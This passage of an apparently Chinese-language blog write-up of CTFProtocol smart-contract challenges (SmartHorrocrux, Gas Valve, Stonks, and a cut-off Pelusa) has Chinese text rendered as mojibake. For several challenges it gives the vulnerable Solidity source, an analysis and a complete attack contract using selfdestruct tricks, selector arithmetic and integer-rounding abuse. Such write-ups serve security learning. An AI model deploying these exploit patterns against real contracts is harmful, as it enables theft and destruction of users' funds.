class="line">â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–“â–’â–“â–’â–‘â–“â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘</span><br><span class="line">â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–’â–ˆâ–“â–’â–’â–“â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘</span><br><span class="line">â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–ˆâ–“â–’â–“â–ˆâ–’â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘</span><br><span class="line">â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–“â–“â–“â–‘â–“â–“â–‘â–‘â–‘â–‘â–‘â–‘â–’â–’â–’â–’â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘</span><br><span class="line">â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–“â–‘â–“â–“â–‘â–’â–‘â–‘â–‘â–’â–’â–ˆâ–“â–ˆâ–“â–“â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘</span><br><span class="line">â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–ˆâ–“â–’â–’â–“â–‘â–‘â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–“â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘</span><br><span class="line">â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–ˆâ–“â–‘â–’â–“â–‘â–‘â–’â–‘â–’â–“â–“â–ˆâ–ˆâ–’â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘</span><br><span class="line">â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–ˆâ–’â–‘â–’â–“â–‘â–‘â–’â–‘â–‘â–‘â–‘â–’â–’â–’â–’â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘</span><br><span class="line">â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–’â–ˆâ–“â–‘â–’â–“â–‘â–‘â–“â–’â–’â–‘â–‘â–’â–’â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘</span><br><span class="line">â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–“â–’â–’â–’â–’â–“â–’â–‘â–‘â–‘â–’â–ˆâ–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘</span><br><span class="line">â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–’â–’â–‘â–‘â–‘â–‘â–‘â–‘â–’â–“â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘</span><br><span class="line">*/</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="2-analysis-4"><a href="#2-analysis-4" class="headerlink" title="2. analysis"></a>2. analysis</h4><blockquote>
<p>ç›®æ ‡æ˜¯æˆåŠŸæ‰§è¡Œ<code>kill()</code>å‡½æ•°ï¼Œè€Œè¦æƒ³è°ƒç”¨æ­¤å‡½æ•°åªèƒ½é€šè¿‡<code>destroyIt(string memory spell)</code>å‡½æ•°ï¼Œåˆ†æ<code>destroyIt()</code>å‡½æ•°</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function destroyIt(string memory spell, uint256 magic) public &#123;</span><br><span class="line">     bytes32 spellInBytes;</span><br><span class="line">     assembly &#123;</span><br><span class="line">         spellInBytes := mload(add(spell, 32))</span><br><span class="line">     &#125;</span><br><span class="line">     require(spellInBytes == _spell, &quot;That spell wouldn&#x27;t kill a fly&quot;);</span><br><span class="line">     require(!invincible, &quot;The Horrocrux is still invincible&quot;);</span><br><span class="line"></span><br><span class="line">     bytes memory kedavra = abi.encodePacked(bytes4(bytes32(uint256(spellInBytes) - magic)));</span><br><span class="line">     address(this).call(kedavra);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>æœ‰ä¸¤ä¸ªæ–­è¨€ï¼š</p>
<ul>
<li><p>æ–­è¨€ä¸€ï¼šå½¢å‚spellçš„å€¼ç­‰äº<code>0x45746865724b6164616272610000000000000000000000000000000000000000</code>ï¼Œè¿™ä¸ªå¯ä»¥åšåˆ°ï¼Œå› ä¸ºè¿™ä¸ªå€¼å¯ä»¥ç”± <a target="_blank" rel="noopener" href="https://www.runoob.com/w3cnote/ascii.html">ASCIIç è¡¨</a> è½¬åŒ–è¿‡æ¥ï¼Œè½¬åŒ–ç»“æœå¦‚ä¸‹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//45 74 68 65 72 48 61 64 61 62 72 61 0000000000000000000000000000000000000000</span><br><span class="line">//EtherKadabra</span><br></pre></td></tr></table></figure>
</li>
<li><p>æ–­è¨€äºŒï¼šè°ƒç”¨ <code>setInvincible()</code>ï¼Œå°†invincibleä¿®æ”¹ä¸ºfalseã€‚è€Œåˆçº¦ä¸­æœ‰ 2weiï¼Œæ‰€ä»¥åªèƒ½é€šè¿‡è§¦å‘<code>fallback</code>å‡½æ•°ï¼Œå†é€šè¿‡<code>selfdestruct</code>å¼ºåˆ¶ç»™åˆçº¦å‘é€ 1weiï¼Œä¸”ä¸ä¼šè§¦å‘å›è°ƒå‡½æ•°<code>fallback</code>ã€‚</p>
</li>
</ul>
<p><em>ä½¿çš„<code>kedava</code>çš„å€¼ç­‰äºkill.selectorï¼Œå¯ä»¥é€šè¿‡ç®€å•çš„è®¡ç®—å¾—åˆ°ï¼š</em></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function cal() internal pure returns (uint magic) &#123;</span><br><span class="line">    uint kill_selector = uint(bytes32(bytes4(abi.encodeWithSignature(&quot;kill()&quot;))));</span><br><span class="line">    magic = uint(_spell) - kill_selector;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>*è¿™é‡Œæœ‰ä¸ªå°é™·é˜±ï¼Œå°±æ˜¯éœ€è¦å°†byte4è½¬åŒ–ä¸€æ¬¡byte32ï¼Œåªæœ‰è¿™æ ·<code>bytes4(abi.encodeWithSignature(&quot;kill()&quot;))</code>æ‰ä¼šå é«˜ä½ï¼Œå¦‚ä¸‹æ‰€ç¤º</p>
<p><img src="/2023/09/01/Smart%20contracts/CTFProtocol/CTFProtocol/image-20230903144340765.png" alt="image-20230903144340765"></p>
</blockquote>
<h4 id="3-solve-4"><a href="#3-solve-4" class="headerlink" title="3. solve"></a>3. solve</h4><p><strong>æ”»å‡»åˆçº¦</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">contract SmartHorrocruxHacker &#123;</span><br><span class="line"></span><br><span class="line">    SmartHorrocrux samrthorrocrux;</span><br><span class="line">    bytes32 private constant _spell = 0x45746865724b6164616272610000000000000000000000000000000000000000;</span><br><span class="line"></span><br><span class="line">    constructor(address _samrthorrocrux) &#123;</span><br><span class="line">        samrthorrocrux = SmartHorrocrux(_samrthorrocrux);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public payable &#123;</span><br><span class="line"></span><br><span class="line">        address(samrthorrocrux).call(&quot;&quot;); // tigger fallback()</span><br><span class="line">        new Helper().kill&#123;value:1&#125;(payable(address(samrthorrocrux)));</span><br><span class="line">        samrthorrocrux.setInvincible(); // lead to invincible = false</span><br><span class="line">        samrthorrocrux.destroyIt(&quot;EtherKadabra&quot;, cal());</span><br><span class="line">        require(!samrthorrocrux.alive(), &quot;It isn&#x27;t dead...&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function cal() internal pure returns (uint magic) &#123;</span><br><span class="line">        uint kill_selector = uint(bytes32(bytes4(abi.encodeWithSignature(&quot;kill()&quot;))));</span><br><span class="line">        magic = uint(_spell) - kill_selector;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Helper &#123;</span><br><span class="line">    function kill(address payable to) public payable &#123;</span><br><span class="line">        require(msg.value == 1 wei);</span><br><span class="line">        selfdestruct(to);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/09/01/Smart%20contracts/CTFProtocol/CTFProtocol/image-20230903144242753.png" alt="image-20230903144242753"></p>
<h3 id="Gas-Valve"><a href="#Gas-Valve" class="headerlink" title="Gas Valve"></a>Gas Valve</h3><h4 id="1-question-5"><a href="#1-question-5" class="headerlink" title="1.question"></a>1.question</h4><blockquote>
<p>The evil Dr. N. Gas has put into orbit a machine that can suck all the air out of the atmosphere. You sneaked into his spaceship and must find a nozzle to open the main valve and stop the machine! Assert the situation and donâ€™t panic. Hint: on the valve is marked â€œmodel no. EIP-150â€</p>
</blockquote>
<p><strong>æºç </strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity 0.8.17;</span><br><span class="line"></span><br><span class="line">interface INozzle &#123;</span><br><span class="line">    function insert() external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/// @title Gas Valve</span><br><span class="line">/// @author https://twitter.com/bahurum</span><br><span class="line">/// @notice The evil Dr. N. Gas has created a machine to suck all the air out of the atmosphere. Anon, you must deactivate it before it&#x27;s too late!</span><br><span class="line">/// @custom:url https://www.ctfprotocol.com/tracks/eko2022/gas-valve</span><br><span class="line">contract Valve &#123;</span><br><span class="line">    bool public open;</span><br><span class="line">    bool public lastResult;</span><br><span class="line"></span><br><span class="line">    function useNozzle(INozzle nozzle) public returns (bool) &#123;</span><br><span class="line">        try nozzle.insert() returns (bool result) &#123;</span><br><span class="line">            lastResult = result;</span><br><span class="line">            return result;</span><br><span class="line">        &#125; catch &#123;</span><br><span class="line">            lastResult = false;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function openValve(INozzle nozzle) external &#123;</span><br><span class="line">        open = true;</span><br><span class="line">        (bool success,) = address(this).call(abi.encodeWithSelector(this.useNozzle.selector, nozzle));</span><br><span class="line">        require(!success);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="2-analysis-5"><a href="#2-analysis-5" class="headerlink" title="2. analysis"></a>2. analysis</h4><blockquote>
<p>è¿™é¢˜è¦æ±‚æˆåŠŸè°ƒç”¨<code>openValve(INozzle nozzle)</code>å‡½æ•°ï¼ŒæˆåŠŸè°ƒç”¨çš„å‰ææ˜¯è°ƒç”¨<code>useNozzle(INozzle nozzle)</code>å¤±è´¥ï¼Œè€Œåœ¨<code>useNozzle(INozzle nozzle)</code>å‡½æ•°ä¸­æœ‰<code>try...catch</code>å¤„ç†è¯­å¥ï¼Œç”¨æ¥å¤„ç†<code>nozzle.insert()</code>ã€‚å°è¯•äº†ä¸€ä¸‹ï¼Œå¯ä»¥å¤„ç†<code>require, revert</code>ç­‰</p>
<p>çœ‹é¢˜è§£æ‰çŸ¥é“ï¼Œä½¿ç”¨<code>selfdestrct()</code>å¯ä»¥ä½¿å¾—å‡½æ•°è°ƒç”¨å¤±è´¥ï¼Œä½†æ˜¯è¯¥å¤±è´¥ä¸ä¼šè¢«try catchæ•è·ã€‚</p>
</blockquote>
<h4 id="3-solve-5"><a href="#3-solve-5" class="headerlink" title="3. solve"></a>3. solve</h4><p><strong>æ”»å‡»åˆçº¦</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">contract GasValueHacker is INozzle &#123;</span><br><span class="line"></span><br><span class="line">    Valve value;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    constructor(address _value) &#123;</span><br><span class="line">        value = Valve(_value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        value.openValve(INozzle(address(this)));</span><br><span class="line">        require(value.open(), &quot;you are not open...&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function insert() external returns (bool) &#123;</span><br><span class="line">        selfdestruct(payable(address(this)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/09/01/Smart%20contracts/CTFProtocol/CTFProtocol/image-20230903160537351.png" alt="image-20230903160537351"></p>
<h3 id="Stonks"><a href="#Stonks" class="headerlink" title="Stonks"></a>Stonks</h3><h4 id="1-question-6"><a href="#1-question-6" class="headerlink" title="1.question"></a>1.question</h4><blockquote>
<p>You have infiltrated in a big investment firm (name says something about arrows), your task is to loose all their money.</p>
</blockquote>
<p><strong>æºç </strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">/// @title Stonks</span><br><span class="line">/// @author https://twitter.com/eugenioclrc</span><br><span class="line">/// @notice You have infiltrated in a big investment firm (name says something about arrows), your task is to loose all their money</span><br><span class="line">/// @custom:url https://www.ctfprotocol.com/tracks/eko2022/stonks</span><br><span class="line">contract Stonks &#123;</span><br><span class="line">    mapping(address =&gt; mapping(uint256 =&gt; uint256)) private _balances;</span><br><span class="line"></span><br><span class="line">    // stock tickers</span><br><span class="line">    uint256 public constant TSLA = 0;</span><br><span class="line">    uint256 public constant GME = 1;</span><br><span class="line"></span><br><span class="line">    ///@dev price oracle 1 TSLA stonk is 50 GME stonks</span><br><span class="line">    uint256 public constant ORACLE_TSLA_GME = 50;</span><br><span class="line"></span><br><span class="line">    constructor(address _player) &#123;</span><br><span class="line">        ///@dev the trader starts with 200 TSLA shares &amp; 1000 GME shares</span><br><span class="line">        _balances[_player][TSLA] = 20;</span><br><span class="line">        _balances[_player][GME] = 1_000;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /// @notice Buy TSLA stonks using GME stonks</span><br><span class="line">    /// @param amountGMEin amount of GME to spend</span><br><span class="line">    /// @param amountTSLAout amount of TSLA to buy</span><br><span class="line">    function buyTSLA(uint256 amountGMEin, uint256 amountTSLAout) external &#123;</span><br><span class="line">        require(amountGMEin / ORACLE_TSLA_GME == amountTSLAout, &quot;Invalid price&quot;);</span><br><span class="line">        _balances[msg.sender][GME] -= amountGMEin;</span><br><span class="line">        _balances[msg.sender][TSLA] += amountTSLAout;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /// @notice Sell TSLA stonks for GME stonks</span><br><span class="line">    /// @param amountTSLAin amount of GME to spend</span><br><span class="line">    /// @param amountGMEout amount of TSLA to buy</span><br><span class="line">    function sellTSLA(uint256 amountTSLAin, uint256 amountGMEout) external &#123;</span><br><span class="line">        require(amountTSLAin * ORACLE_TSLA_GME == amountGMEout, &quot;Invalid price&quot;);</span><br><span class="line">        _balances[msg.sender][TSLA] -= amountTSLAin;</span><br><span class="line">        _balances[msg.sender][GME] += amountGMEout;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function balanceOf(address _owner, uint256 _ticker) external view returns (uint256) &#123;</span><br><span class="line">        return _balances[_owner][_ticker];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="2-analysis-6"><a href="#2-analysis-6" class="headerlink" title="2. analysis"></a>2. analysis</h4><blockquote>
<p>åªè¦çŸ¥é“åœ¨solidityä¸­æ²¡æœ‰å››èˆäº”å…¥ï¼Œå°æ•°ç‚¹éƒ½æ˜¯é‡‡ç”¨ç›´æ¥æŠ¹é™¤å³å‘ä¸‹å–æ•´çš„æ–¹å¼å¤„ç†å°æ•°çš„ï¼Œè¿™é“é¢˜å°±å¾ˆå¥½è§£ï¼Œåˆ©ç”¨å¥½<code>require(amountGMEin / ORACLE_TSLA_GME == amountTSLAout, &quot;Invalid price&quot;);</code>ä¸­çš„é™¤æ³•è¿ç®—å³å¯ã€‚<em>40 &#x2F; 50 &#x3D; 0</em></p>
</blockquote>
<h4 id="3-solve-6"><a href="#3-solve-6" class="headerlink" title="3. solve"></a>3. solve</h4><p><strong>æ”»å‡»åˆçº¦</strong></p>
<p><em>æ”»å‡»é€»è¾‘ï¼šå…ˆéƒ¨ç½²hackerï¼Œå°†hackerè®¾ç½®ä¸ºplayerï¼Œå°†stonksåœ°å€ä¼ å…¥hackerçš„attackå‡½æ•°ä¸­ï¼Œç„¶åè°ƒç”¨è¯¥å‡½æ•°å³å¯å®Œæˆæ”»å‡»ã€‚</em></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">contract StonksHacker &#123;</span><br><span class="line"></span><br><span class="line">    Stonks stonks;</span><br><span class="line"></span><br><span class="line">    function attack(address _stonks) public &#123;</span><br><span class="line"></span><br><span class="line">        stonks = Stonks(_stonks);</span><br><span class="line">        stonks.sellTSLA(20, 1000); // let TSLA swap GAM</span><br><span class="line">        </span><br><span class="line">        for (uint i; i &lt; 2000 / 40; i++) &#123;</span><br><span class="line">            stonks.buyTSLA(40, 0);</span><br><span class="line">        &#125;</span><br><span class="line">        require(stonks.balanceOf(address(this), 0) == 0, &quot;TSLA is not zero&quot;);</span><br><span class="line">        require(stonks.balanceOf(address(this), 1) == 0, &quot;GAM is not zero&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/09/01/Smart%20contracts/CTFProtocol/CTFProtocol/image-20230903173354634.png" alt="image-20230903173354634"></p>
<h3 id="Pelusa"><a href="#Pelusa" class="headerlink" title="Pelusa"></a>Pelusa</h3><h4 id="1-question-7"><a href="#1-question-7" class="headerlink" title="1.question"></a>1.question</h4><blockquote>
<p>You just open your eyes and are in Mexico 1986, help Diego to set the score from 1 to 2 goals for a win, do whatever is necessary!</p>
</blockquote>
<p><strong>æºç </strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.7;</span><br><span class="line"></span><br><span class="line">interface IGame &#123;</span><br><span class="line">    function getBallPossesion() external view returns (address);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// &quot;el baile de la gambeta&quot;</span><br><span class="line">// https://www.youtube.com/watch?v=qzxn85zX2aE</span><br><span class="line"></span><br><span class="line">/// @title Pelusa</span><br><span class="line">/// @author https://twitter.com/eugenioclrc</span><br><span class="line">/// @notice Its 1986, you are in the football world cup (Mexico86), help Diego score a goal.</span><br><span class="line">/// @custom:url https://www.ctfprotocol.com/tracks/eko2022/pelusa</span><br><span class="line">contract Pelusa &#123;</span><br><span class="line">    address private immutable owner;</span><br><span class="line"></span><br><span class="line">    address internal player;</span><br><span class="line"></span><br><span class="line">    uint256 public goals = 1;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        owner = address(uint160(uint256(keccak256(abi.encodePacked(msg.sender, blockhash(block.number))))));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function passTheBall() external &#123;</span><br><span class="line">        require(msg.sender.code.length == 0, &quot;Only EOA players&quot;);</span><br><span class="line">        /// @dev &quot;la pelota siempre al 10&quot;</span><br><span class="line">        require(uint256(uint160(msg.sender)) % 100 == 10, &quot;not allowed&quot;);</span><br><span class="line"></span><br><span class="line">        player = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isGoal() public view returns (bool) &#123;</span><br><span class="line">        // expect ball in owners posession</span><br><span class="line">        return IGame(player).getBallPossesion() == owner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function shoot() external &#123;</span><br><span class="line">        require(isGoal(), &quot;missed&quot;);</span><br><span class="line">        /// 